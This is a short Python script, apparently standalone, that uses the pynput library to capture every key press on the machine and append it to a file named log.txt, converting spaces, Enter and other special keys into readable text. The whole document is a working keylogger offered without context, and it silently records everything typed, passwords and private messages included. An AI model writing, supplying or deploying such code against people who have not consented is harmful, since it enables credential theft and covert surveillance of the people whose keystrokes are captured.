from pynput.keyboard import Listener

def log_keystroke(key):
    key = str(key).replace("'", "")
    
    if key == "Key.space":
        key = " "
    elif key == "Key.enter":
        key = "\n"
    elif key.startswith("Key."):
        key = f"<{key[4:]}>"

    with open("log.txt", "a") as file:
        file.write(key)

with Listener(on_press=log_keystroke) as listener:
    listener.join()
